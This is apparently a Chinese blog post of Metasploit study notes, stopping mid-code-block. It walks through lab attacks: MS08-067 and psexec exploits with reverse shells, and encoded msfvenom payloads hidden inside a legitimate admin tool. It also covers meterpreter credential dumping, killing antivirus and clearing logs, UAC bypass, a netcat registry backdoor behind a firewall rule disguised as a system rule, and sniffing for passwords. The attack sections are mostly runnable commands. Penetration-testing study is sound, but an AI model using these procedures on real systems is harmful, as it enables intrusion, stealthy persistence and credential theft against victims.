    <content type="html"><![CDATA[<h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01.写在前面"></a>0x01.写在前面</h1><blockquote><p><strong>Metasploit项目</strong>是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收费版本，但功能也更加强大。最新的MSF为MSF5.0，5.0提供了新的数据服务，引入了新的免杀功能，支持多种语言。</p></blockquote><p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p><a id="more"></a><h2 id="一、MSF5的7大模块"><a href="#一、MSF5的7大模块" class="headerlink" title="一、MSF5的7大模块"></a>一、MSF5的7大模块</h2><hr><h3 id="1-auxiliary"><a href="#1-auxiliary" class="headerlink" title="1.auxiliary"></a>1.auxiliary</h3><blockquote><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p></blockquote><h3 id="2-exploits"><a href="#2-exploits" class="headerlink" title="2.exploits"></a>2.exploits</h3><blockquote><p>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） </p></blockquote><h3 id="3-payloads"><a href="#3-payloads" class="headerlink" title="3.payloads"></a>3.payloads</h3><blockquote><p>成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p><p>single：一个完整的payload，不需要外部库，all-in-one</p><p>stager：目标计算机内存有限，先传输一个较小的payload用于建立连接</p><p>stages：利用stager建立的连接下载后续的payload</p><p>stager与stages有多种类型，适用于不同场景</p></blockquote><h3 id="4-encoders"><a href="#4-encoders" class="headerlink" title="4.encoders"></a>4.encoders</h3><blockquote><p>对payload进行加密，躲避Anti Virus检查的模块</p></blockquote><h3 id="5-nops"><a href="#5-nops" class="headerlink" title="5.nops"></a>5.nops</h3><blockquote><p>提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</p></blockquote><h3 id="6-post"><a href="#6-post" class="headerlink" title="6.post"></a>6.post</h3><blockquote><p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 </p></blockquote><h3 id="7-evasion"><a href="#7-evasion" class="headerlink" title="7.evasion"></a>7.evasion</h3><blockquote><p>用于免杀绕过</p></blockquote><h2 id="二、msfconsole控制台"><a href="#二、msfconsole控制台" class="headerlink" title="二、msfconsole控制台"></a>二、msfconsole控制台</h2><p>一般参数</p><blockquote><p>msfconsole -h    查看帮助信息</p><p>msfconsole -q    安静启动</p></blockquote><p>一般命令</p><blockquote><p>banner    banner信息</p><p>color    颜色设置</p><p>connect    连接设置</p></blockquote><p>控制台常用命令</p><blockquote><p>show 模块    查看模块信息</p><p>search 参数    查找指定信息。例如：search name:mysql</p><p>use 指定文件    使用指定文件。例如：use exploit/windows/smb/ms08_067_netapi</p><p>在use下可以查看info信息，查看当前exp下可以使用的payload、系统等信息。</p><p>在use下也可以使用show missing查看需要配置的参数，show options查看配置的参数，show targets查看可以利用的对象，show advanced查看高级配置参数，show evasion查看面纱绕过信息</p><p>set/unset    用于设置</p><p>setg/unsetg    全局设置，仅在当前会话有效，退出失效，可以使用save保存</p><p>check    用于测试是否可以利用</p><p>back    返回上一级</p><p>db_    一系列参数</p><p>hosts    查看主机参数</p><p>hosts -c    查看指定列</p><p>hosts -S    以指定参数搜索</p><p>services    查看端口等（-S/-c）</p><p>run    执行当前模块</p><p>load    导入外部模块</p><p>resource    指定资源文件    文件名.rc，将配置直接写入.rc，msfconsole -r 文件名.rc</p></blockquote><p>一个反弹shell小案例，本次利用ms08_067</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set rhost 192.168.1.200</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set target 34</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png" class><h2 id="三、实验案例"><a href="#三、实验案例" class="headerlink" title="三、实验案例"></a>三、实验案例</h2><h3 id="1-active-exploit与PassiveMoudle案例"><a href="#1-active-exploit与PassiveMoudle案例" class="headerlink" title="(1)active exploit与PassiveMoudle案例"></a>(1)active exploit与PassiveMoudle案例</h3><p>ActiveModule</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search smb/psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">search shell/reverse</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set rhosts 192.168.1.100</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS 11</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><p>PassiveMoudle</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">use windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set srvhost 192.168.1.6</span><br><span class="line">run # 等待访问即可</span><br></pre></td></tr></table></figure><h3 id="（2）生成payload案例"><a href="#（2）生成payload案例" class="headerlink" title="（2）生成payload案例"></a>（2）生成payload案例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use windows/shell_bind_tcp</span><br><span class="line">generate # 编码</span><br><span class="line">generate -b &#x27;\x00&#x27; # 过滤坏字符</span><br><span class="line">-e x86/shikata_ga_nai # 指定编码</span><br><span class="line">-i 5 # 指定编码次数</span><br><span class="line">-k # 使用当前进程，开启一个新的线程</span><br><span class="line">-x /usr/share/windows-binaries/radmin.exe # 使用一个正常的模板</span><br><span class="line">-f exe # 输出指定格式文件</span><br><span class="line">-o /root/1.exe # 输出文件的名字</span><br><span class="line">-n 14 # 添加14个字节的NOP,NOP是无任何操作字符，可以起到混淆绕过免杀的作用</span><br></pre></td></tr></table></figure><p>小案例，生成一个伪造的远程管理小程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f exe -o /root/1.exe</span><br></pre></td></tr></table></figure><p>执行</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png" class><p>nc，getshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png" class><h2 id="四、meterpreter，注入到合法的操作系统里的进程，随机。"><a href="#四、meterpreter，注入到合法的操作系统里的进程，随机。" class="headerlink" title="四、meterpreter，注入到合法的操作系统里的进程，随机。"></a>四、meterpreter，注入到合法的操作系统里的进程，随机。</h2><p>1.meterpreter shell 案例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">set target 34</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions 1</span><br></pre></td></tr></table></figure><p>拿到meterpreter shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png" class><p>2.meterpreter shell下的常用命令，在meterpreter shell下可以使用Linux命令与Windows命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">help # 帮助</span><br><span class="line">background # 返回msfconlse，并保存session</span><br><span class="line">dir,pwd,cat,ls,mkdir,rmdir, edit,lcd,lpwd等</span><br><span class="line">bgrun killav # 杀死杀病毒软件</span><br><span class="line">bgrun vnc # 监控</span><br><span class="line">clearev # 清除日志</span><br><span class="line">download # 下载文件 download boot.ini</span><br><span class="line">upload # 上传 例如：upload /usr/share/windows-binaries/nc.exe c:</span><br><span class="line">execute # 执行 例如：execute -f cmd.exe -i -H -f为运行哪个程序 -i为交互 -H为隐藏</span><br><span class="line">getuid # 查看当前用户</span><br><span class="line">getsystem # 提权到system</span><br><span class="line">getprivs # 查看有哪些权限</span><br><span class="line">getproxy # 获取代理</span><br><span class="line">getpid # 获取进程号</span><br><span class="line">migrate 1548 # 迁移进程</span><br><span class="line">hashdump # 获取用户的哈希值</span><br><span class="line">sysinfo # 查看系统信息</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">shell # 获取shell</span><br><span class="line">show_mount # 查看挂载硬盘</span><br><span class="line">search -f ein.ini # 查找文件</span><br><span class="line">arp</span><br><span class="line">netstat</span><br><span class="line">ipcofnig</span><br><span class="line">ifconfig</span><br><span class="line">route</span><br><span class="line">idletime # 查看停止操作的时间</span><br><span class="line">resource -r 文件 # 调用资源文件</span><br><span class="line">record_mic # 麦克风</span><br><span class="line">webcam_list # 摄像头</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五、-msfcli"><a href="#五、-msfcli" class="headerlink" title="五、 msfcli"></a>五、 msfcli</h2><p>已被msfconsole -x代替，不好玩</p><p>例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set rhosts 192.168.1.200;</span><br><span class="line">set target 34;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp;</span><br><span class="line">set lhost 192.168.1.6;</span><br><span class="line">run -j&quot;</span><br></pre></td></tr></table></figure><hr><hr><hr><hr><h1 id="0x02-MSF信息收集"><a href="#0x02-MSF信息收集" class="headerlink" title="0x02.MSF信息收集"></a>0x02.MSF信息收集</h1><h2 id="一、内置外部工具"><a href="#一、内置外部工具" class="headerlink" title="一、内置外部工具"></a>一、内置外部工具</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure><h2 id="二、auxiliary模块"><a href="#二、auxiliary模块" class="headerlink" title="二、auxiliary模块"></a>二、auxiliary模块</h2><h3 id="例一，arp主机扫描"><a href="#例一，arp主机扫描" class="headerlink" title="例一，arp主机扫描"></a>例一，arp主机扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search arp</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set interface eth0 # 设置网卡</span><br><span class="line">set rhosts 192.168.1.0/24 # 设置网段</span><br><span class="line">set threads 20 # 设置线程数</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例二，端口扫描"><a href="#例二，端口扫描" class="headerlink" title="例二，端口扫描"></a>例二，端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">set interface eth0</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.1.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例三，UDP扫描"><a href="#例三，UDP扫描" class="headerlink" title="例三，UDP扫描"></a>例三，UDP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><h3 id="例四，SMTP扫描"><a href="#例四，SMTP扫描" class="headerlink" title="例四，SMTP扫描"></a>例四，SMTP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/default/snmpd #修改侦听地址  0.0.0.0</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers （windows）</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares （windows）</span><br></pre></td></tr></table></figure><h3 id="例五，SMB扫描"><a href="#例五，SMB扫描" class="headerlink" title="例五，SMB扫描"></a>例五，SMB扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">版本扫描</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">扫描命令管道，判断SMB服务类型（账号，密码）</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">扫描通过SMB管道可以访问的RCERPC服务</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMB枚举共享</span><br><span class="line">use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMB用户枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB SID（RID）枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h3 id="例六，SSH扫描"><a href="#例六，SSH扫描" class="headerlink" title="例六，SSH扫描"></a>例六，SSH扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SSH版本扫描</span><br><span class="line">use auxiliary/scanner/ssh/ssh_versio</span><br><span class="line"></span><br><span class="line">SSH密码爆破</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"></span><br><span class="line">SSH公钥登入</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login_pubkey</span><br></pre></td></tr></table></figure><h1 id="0x03-MSF漏洞扫描"><a href="#0x03-MSF漏洞扫描" class="headerlink" title="0x03.MSF漏洞扫描"></a>0x03.MSF漏洞扫描</h1><h2 id="实验案例"><a href="#实验案例" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="例一，vnc密码破解"><a href="#例一，vnc密码破解" class="headerlink" title="例一，vnc密码破解"></a>例一，vnc密码破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">threads 30</span><br><span class="line">set BlANK_PASSWORDS yes</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例二，vnc无密码访问"><a href="#例二，vnc无密码访问" class="headerlink" title="例二，vnc无密码访问"></a>例二，vnc无密码访问</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例三，RDP远程桌面漏洞"><a href="#例三，RDP远程桌面漏洞" class="headerlink" title="例三，RDP远程桌面漏洞"></a>例三，RDP远程桌面漏洞</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/ms12_020_check # 无DOS攻击</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # DOS攻击，蓝屏关机</span><br></pre></td></tr></table></figure><h3 id="例四，显示目录及文件"><a href="#例四，显示目录及文件" class="headerlink" title="例四，显示目录及文件"></a>例四，显示目录及文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/files_dir</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例五，WebDAV-Unicode编码身份验证绕过"><a href="#例五，WebDAV-Unicode编码身份验证绕过" class="headerlink" title="例五，WebDAV Unicode编码身份验证绕过"></a>例五，WebDAV Unicode编码身份验证绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_webdav_unicode_bypass</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例六，wmap"><a href="#例六，wmap" class="headerlink" title="例六，wmap"></a>例六，wmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先需要load wmap</span><br><span class="line">根据sqlmap工作模式开发</span><br></pre></td></tr></table></figure><h1 id="0x04-MSF客户端渗透"><a href="#0x04-MSF客户端渗透" class="headerlink" title="0x04.MSF客户端渗透"></a>0x04.MSF客户端渗透</h1><h2 id="实验案例-1"><a href="#实验案例-1" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.6 lport=4444 -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -f exe -o what.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x05-后渗透测试"><a href="#0x05-后渗透测试" class="headerlink" title="0x05.后渗透测试"></a>0x05.后渗透测试</h1><h2 id="实验案例-2"><a href="#实验案例-2" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="提权，案例一"><a href="#提权，案例一" class="headerlink" title="提权，案例一"></a>提权，案例一</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.1.6 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o</span><br><span class="line">1.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">exploit -j</span><br><span class="line">运行1.exe</span><br><span class="line"></span><br><span class="line">得到LLuna用户权限</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">基于session提权(UAC允许)</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set filename winupdate.exe</span><br><span class="line">set session 1</span><br><span class="line">点击确定get shell</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">绕过UAC提权，会出现Already in elevated state（已经处于提升状态）</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">使用DDL动态链接库绕过</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line"></span><br><span class="line">使用漏洞提权</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure><h3 id="案例二，使用注册表添加NC后门服务"><a href="#案例二，使用注册表添加NC后门服务" class="headerlink" title="案例二，使用注册表添加NC后门服务"></a>案例二，使用注册表添加NC后门服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32(上传nc)</span><br><span class="line">查看键值对</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">增加键值对</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">再次查看</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">打开一个隐式shell，并查看防火墙</span><br><span class="line">execute -f cmd -i -H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line"></span><br><span class="line">如果开启则添加放行策略</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;Core Networking - DNS (UDP-Out) - fjy&quot; ENABLE ALL</span><br><span class="line">(Core Networking - DNS (UDP-Out)为系统自带规则用于伪装)</span><br><span class="line"></span><br><span class="line">重启</span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">连接</span><br><span class="line">nc 192.168.1.200 444</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png" class><h3 id="案例三、抓包"><a href="#案例三、抓包" class="headerlink" title="案例三、抓包"></a>案例三、抓包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在获取到meterpreter shell的情况下</span><br><span class="line">meterpreter &gt; load sniffer    # 导入sniffer</span><br><span class="line">meterpreter &gt; sniffer_start 3 # 选择网卡进行抓包，抓包方法为在内存中缓存区块循环存储抓包，默认50000个包，不写硬盘中，并且智能过滤meterpreter流量，传输过程使用SSL/TLS加密。</span><br><span class="line">sniffer_dump 3 text.cap # 下载抓到的包</span><br><span class="line"></span><br><span class="line">抓到的包可以使用wireshark进行分析，也可以使用MSF自带解码进行解码</span><br><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set PCAPFILE text.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png" class><p>可以看到用户名与密码</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png" class><h3 id="案例四、文件搜索"><a href="#案例四、文件搜索" class="headerlink" title="案例四、文件搜索"></a>案例四、文件搜索</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f *.ini</span><br><span class="line">search -d C:\\Users\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure><h3 id="案例五、时间取证分析"><a href="#案例五、时间取证分析" class="headerlink" title="案例五、时间取证分析"></a>案例五、时间取证分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 